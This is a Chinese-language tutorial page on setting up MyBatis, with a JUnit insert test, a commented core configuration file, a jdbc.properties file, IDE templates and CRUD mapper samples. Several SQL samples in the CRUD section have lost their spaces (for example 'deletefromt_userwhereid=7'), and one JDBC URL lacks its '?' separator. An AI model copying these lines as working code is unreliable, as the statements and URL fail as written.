class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.atguigu.mybatis.test;<br><br><span class="hljs-keyword">import</span> com.atguigu.mybatis.mapper.UserMapper;<br><span class="hljs-keyword">import</span> org.apache.ibatis.io.Resources;<br><span class="hljs-keyword">import</span> org.apache.ibatis.session.SqlSession;<br><span class="hljs-keyword">import</span> org.apache.ibatis.session.SqlSessionFactory;<br><span class="hljs-keyword">import</span> org.apache.ibatis.session.SqlSessionFactoryBuilder;<br><span class="hljs-keyword">import</span> org.junit.Test;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyBatisTest</span> &#123;<br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testInsert</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">// 获取核心配置文件的输入流</span><br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> Resources.getResourceAsStream(<span class="hljs-string">&quot;mybatis-config.xml&quot;</span>);<br>        <span class="hljs-comment">// 获取SqlSessionFactoryBuilder对象</span><br>        <span class="hljs-type">SqlSessionFactoryBuilder</span> <span class="hljs-variable">sqlSessionFactoryBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SqlSessionFactoryBuilder</span>();<br>        <span class="hljs-comment">// 获取SqlSessionFactory对象</span><br>        <span class="hljs-type">SqlSessionFactory</span> <span class="hljs-variable">sqlSessionFactory</span> <span class="hljs-operator">=</span> sqlSessionFactoryBuilder.build(is);<br>        <span class="hljs-comment">// 获取Sql的会话对象SqlSession, 是MyBatis提供的操作数据库的对象</span><br>        <span class="hljs-comment">// openSession设置true会自动提交事务</span><br>        <span class="hljs-comment">// SqlSession sqlSession = sqlSessionFactory.openSession(true);</span><br>        <span class="hljs-type">SqlSession</span> <span class="hljs-variable">sqlSession</span> <span class="hljs-operator">=</span> sqlSessionFactory.openSession();<br><br>        <span class="hljs-comment">// 对于以上操作, 每个都是相同, 可以封装起来, 方便开发</span><br>        <span class="hljs-comment">// 获取UserMapper的代理实现类对象 ,  getMapper的底层就是下边代码的sqlSession.insert</span><br>        <span class="hljs-type">UserMapper</span> <span class="hljs-variable">mapper</span> <span class="hljs-operator">=</span> sqlSession.getMapper(UserMapper.class);<br>        <span class="hljs-comment">// 调用mapper接口中的方法, 实现添加用户信息的功能</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> mapper.insertUser();<br>        <span class="hljs-comment">// 也可以通过sql以及的唯一表示找到sql并执行, 唯一标识是namespace, sqlid,  一半不会用</span><br>        <span class="hljs-comment">// int result = sqlSession.insert(&quot;com.atguigu.mybatis.mapper.UserMapper.insertUser&quot;);</span><br>        System.out.println(<span class="hljs-string">&quot;结果: &quot;</span> + result);<br>        <span class="hljs-comment">// 这里默认没有提交事务, 默认是回滚的</span><br>        <span class="hljs-comment">// 手动提交事务</span><br>        sqlSession.commit();<br>        sqlSession.close();<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>目录结构<br><img src="https://cdn.nlark.com/yuque/0/2023/png/12889352/1676081379312-2580ee59-52a5-47e1-8b22-5154c470d515.png#averageHue=%23847251&amp;clientId=u71b6e545-d468-4&amp;from=paste&amp;height=656&amp;id=u20a1f652&amp;name=image.png&amp;originHeight=820&amp;originWidth=1841&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=107712&amp;status=done&amp;style=none&amp;taskId=u78432b89-79d8-4be4-b1a2-ac50ed6eafb&amp;title=&amp;width=1472.8" alt="image.png"></p><h3 id="2-9-总结">2.9 总结</h3><div class="info"><p>本节主要是一个快速入门, 怎么从0到1的搭建起mybatis, 并实现一个helloword的案例</p></div><h2 id="3-核心配置文件详解">3. 核心配置文件详解</h2><blockquote><p>核心配置文件中的标签必须按照固定的顺序：<br>properties?,settings?,typeAliases?,typeHandlers?,objectFactory?,objectWrapperFactory?,refl<br>ectorFactory?,plugins?,environments?,databaseIdProvider?,mappers?</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">configuration</span></span><br><span class="hljs-meta">        <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span><br><span class="hljs-meta">        <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">    MyBatis核心配置文件中，标签的顺序：</span><br><span class="hljs-comment">    properties?,settings?,typeAliases?,typeHandlers?,</span><br><span class="hljs-comment">    objectFactory?,objectWrapperFactory?,reflectorFactory?,</span><br><span class="hljs-comment">    plugins?,environments?,databaseIdProvider?,mappers?</span><br><span class="hljs-comment">    --&gt;</span><br>    <span class="hljs-comment">&lt;!--引入properties文件--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span> <span class="hljs-attr">resource</span>=<span class="hljs-string">&quot;jdbc.properties&quot;</span>/&gt;</span><br>    <span class="hljs-comment">&lt;!--设置类型别名--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">typeAliases</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">        typeAlias：设置某个类型的别名</span><br><span class="hljs-comment">        属性：</span><br><span class="hljs-comment">        type：设置需要设置别名的类型</span><br><span class="hljs-comment">        alias：设置某个类型的别名，若不设置该属性，那么该类型拥有默认的别名，即类名</span><br><span class="hljs-comment">        且不区分大小写</span><br><span class="hljs-comment">        --&gt;</span><br>        <span class="hljs-comment">&lt;!--&lt;typeAlias type=&quot;com.atguigu.mybatis.pojo.User&quot;&gt;&lt;/typeAlias&gt;--&gt;</span><br>      <br>        <span class="hljs-comment">&lt;!--以包为单位，将包下所有的类型设置默认的类型别名，即类名且不区分大小写--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;com.atguigu.mybatis.pojo&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">typeAliases</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">    environments：配置多个连接数据库的环境</span><br><span class="hljs-comment">    属性：</span><br><span class="hljs-comment">    default：设置默认使用的环境的id</span><br><span class="hljs-comment">    --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">environments</span> <span class="hljs-attr">default</span>=<span class="hljs-string">&quot;development&quot;</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">        environment：配置某个具体的环境</span><br><span class="hljs-comment">        属性：</span><br><span class="hljs-comment">        id：表示连接数据库的环境的唯一标识，不能重复</span><br><span class="hljs-comment">        --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">environment</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;development&quot;</span>&gt;</span><br>            <span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">            transactionManager：设置事务管理方式</span><br><span class="hljs-comment">            属性：</span><br><span class="hljs-comment">            type=&quot;JDBC|MANAGED&quot;</span><br><span class="hljs-comment">            JDBC：表示当前环境中，执行SQL时，使用的是JDBC中原生的事务管理方式，事</span><br><span class="hljs-comment">            务的提交或回滚需要手动处理</span><br><span class="hljs-comment">            MANAGED：被管理，例如Spring</span><br><span class="hljs-comment">            --&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">transactionManager</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;JDBC&quot;</span>/&gt;</span><br>            <span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">            dataSource：配置数据源</span><br><span class="hljs-comment">            属性：</span><br><span class="hljs-comment">            type：设置数据源的类型</span><br><span class="hljs-comment">            type=&quot;POOLED|UNPOOLED|JNDI&quot;</span><br><span class="hljs-comment">            POOLED：表示使用数据库连接池缓存数据库连接</span><br><span class="hljs-comment">            UNPOOLED：表示不使用数据库连接池</span><br><span class="hljs-comment">            JNDI：表示使用上下文中的数据源</span><br><span class="hljs-comment">            --&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;POOLED&quot;</span>&gt;</span><br>                <span class="hljs-comment">&lt;!--设置连接数据库的驱动--&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;driver&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;jdbc.driver&#125;&quot;</span>/&gt;</span><br>                <span class="hljs-comment">&lt;!--设置连接数据库的连接地址--&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;jdbc.url&#125;&quot;</span>/&gt;</span><br>                <span class="hljs-comment">&lt;!--设置连接数据库的用户名--&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;jdbc.username&#125;&quot;</span>/&gt;</span><br>                <span class="hljs-comment">&lt;!--设置连接数据库的密码--&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;jdbc.password&#125;&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">environment</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">environment</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;test&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">transactionManager</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;JDBC&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;POOLED&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;driver&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>/&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;url&quot;</span></span><br><span class="hljs-tag">                          <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;jdbc:mysql://localhost:3306/ssmserverTimezone=UTC&quot;</span>/&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;root&quot;</span>/&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;123456&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">environment</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">environments</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--引入映射文件--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">mappers</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--&lt;mapper resource=&quot;mappers/UserMapper.xml&quot;/&gt;--&gt;</span><br>        <span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">        以包为单位引入映射文件</span><br><span class="hljs-comment">        要求：</span><br><span class="hljs-comment">        1、mapper接口所在的包要和映射文件所在的包一致</span><br><span class="hljs-comment">        2、mapper接口要和映射文件的名字一致</span><br><span class="hljs-comment">        --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;com.atguigu.mybatis.mapper&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">mappers</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="3-1-技巧1">3.1 技巧1</h3><blockquote><p>可以讲一些参数抽出来, 放到properties文件中<br>resource目录 新建 resource bundle</p></blockquote><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">jdbc.driver</span>=<span class="hljs-string">com.mysql.cj.jdbc.Driver</span><br><span class="hljs-attr">jdbc.url</span>=<span class="hljs-string">jdbc:mysql://localhost:3306/ssm?serverTimezone=UTC</span><br><span class="hljs-attr">jdbc.username</span>=<span class="hljs-string">root</span><br><span class="hljs-attr">jdbc.password</span>=<span class="hljs-string">root</span><br></code></pre></td></tr></table></figure><p>通过以上方法mybatis-config.xml可写为以下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"> <span class="hljs-comment">&lt;!--引入properties文件--&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">properties</span> <span class="hljs-attr">resource</span>=<span class="hljs-string">&quot;jdbc.properties&quot;</span>/&gt;</span><br><br> <span class="hljs-tag">&lt;<span class="hljs-name">environments</span> <span class="hljs-attr">default</span>=<span class="hljs-string">&quot;development&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">environment</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;development&quot;</span>&gt;</span>          <br>         <span class="hljs-tag">&lt;<span class="hljs-name">transactionManager</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;JDBC&quot;</span>/&gt;</span><br>         <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;POOLED&quot;</span>&gt;</span><br>             <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;driver&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;jdbc.driver&#125;&quot;</span>/&gt;</span><br>             <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;jdbc.url&#125;&quot;</span>/&gt;</span><br>             <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;jdbc.username&#125;&quot;</span>/&gt;</span><br>             <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;jdbc.password&#125;&quot;</span>/&gt;</span><br>         <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span><br>     <span class="hljs-tag">&lt;/<span class="hljs-name">environment</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">environments</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="3-2-技巧2">3.2 技巧2</h3><blockquote><p>映射文件</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">mappers</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">        以包的形式映入映射文件, 但必须满足两个条件</span><br><span class="hljs-comment">        1. mapper接口和映射文件所在的包必需一致</span><br><span class="hljs-comment">        2. mapper接口的名字和映射文件的名字必须一致</span><br><span class="hljs-comment">    --&gt;</span><br>    <span class="hljs-comment">&lt;!--&lt;mapper resource=&quot;mappers/UserMapper.xml&quot;/&gt;--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;com.atguigu.mybatis.mapper&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">mappers</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="3-3-mybatis配置文件模板"><img src="https://cdn.nlark.com/yuque/0/2023/png/12889352/1676084220671-af430398-152b-43f4-b1e8-8300559a30b5.png#averageHue=%235c7c62&amp;clientId=u71b6e545-d468-4&amp;from=paste&amp;height=417&amp;id=uaff9be0d&amp;name=image.png&amp;originHeight=521&amp;originWidth=1182&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=98851&amp;status=done&amp;style=none&amp;taskId=u63b883f2-5006-41f4-8fe1-0a11aa0b6b0&amp;title=&amp;width=945.6" alt="image.png">3.3 mybatis配置文件模板</h3><ol><li class="lvl-3"><p>setting-editor-file and code templates</p></li><li class="lvl-3"><p>新建两个xml文件, 一个mybatis-config.xm, 一个mybatis-mapper.xml配置文件</p></li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">configuration</span></span><br><span class="hljs-meta">        <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span><br><span class="hljs-meta">        <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">    MyBatis核心配置文件中，标签的顺序：</span><br><span class="hljs-comment">    properties?,settings?,typeAliases?,typeHandlers?,</span><br><span class="hljs-comment">    objectFactory?,objectWrapperFactory?,reflectorFactory?,</span><br><span class="hljs-comment">    plugins?,environments?,databaseIdProvider?,mappers?</span><br><span class="hljs-comment">    --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span> <span class="hljs-attr">resource</span>=<span class="hljs-string">&quot;jdbc.properties&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">typeAliases</span>&gt;</span> <br>        <span class="hljs-comment">&lt;!--&lt;typeAlias type=&quot;com.atguigu.mybatis.pojo.User&quot;&gt;&lt;/typeAlias&gt;--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">typeAliases</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">environments</span> <span class="hljs-attr">default</span>=<span class="hljs-string">&quot;development&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">environment</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;development&quot;</span>&gt;</span> <br>            <span class="hljs-tag">&lt;<span class="hljs-name">transactionManager</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;JDBC&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;POOLED&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;driver&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;jdbc.driver&#125;&quot;</span>/&gt;</span><br>              <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;jdbc.url&#125;&quot;</span>/&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;jdbc.username&#125;&quot;</span>/&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;jdbc.password&#125;&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">environment</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">environments</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">mappers</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--&lt;mapper resource=&quot;mappers/UserMapper.xml&quot;/&gt;--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">mappers</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">mapper</span></span><br><span class="hljs-meta">        <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span><br><span class="hljs-meta">        <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="3-4-总结">3.4 总结</h3><div class="info"><ol><li class="lvl-3"><p>mybatis每个标签是有顺序的</p></li><li class="lvl-3"><p>每次实体类全类名太长, 可通过typeAliases标签  起别名 or 导入整个实体类包</p></li></ol><typeAliases>        <package name="com.it.mybatis.pojo"></package></typeAliases><ol start="3"><li class="lvl-3"><p>每次mapper接口全类名太长, 可通过mapper标签  起别名 or 导入整个mapper文件</p></li></ol><mappers><package name="com.atguigu.mybatis.mapper"></package></mappers><ol start="4"><li class="lvl-3"><p>会用idea创建模板</p></li></ol></div><h2 id="4-mybatis增删改查">4. mybatis增删改查</h2><h3 id="4-1-demo">4.1 demo</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--int insertUser();--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">insert</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;insertUser&quot;</span>&gt;</span><br>insert into t_user values(null,&#x27;admin&#x27;,&#x27;123456&#x27;,23,&#x27;男&#x27;)<br><span class="hljs-tag">&lt;/<span class="hljs-name">insert</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--intdeleteUser();--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">delete</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;deleteUser&quot;</span>&gt;</span><br>  deletefromt_userwhereid=7<br><span class="hljs-tag">&lt;/<span class="hljs-name">delete</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--intupdateUser();--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">update</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;updateUser&quot;</span>&gt;</span><br>  updatet_usersetusername=&#x27;ybc&#x27;,password=&#x27;123&#x27;whereid=6<br><span class="hljs-tag">&lt;/<span class="hljs-name">update</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--UsergetUserById();--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getUserById&quot;</span><span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;com.atguigu.mybatis.bean.User&quot;</span>&gt;</span><br>  select*fromt_userwhereid=2<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight 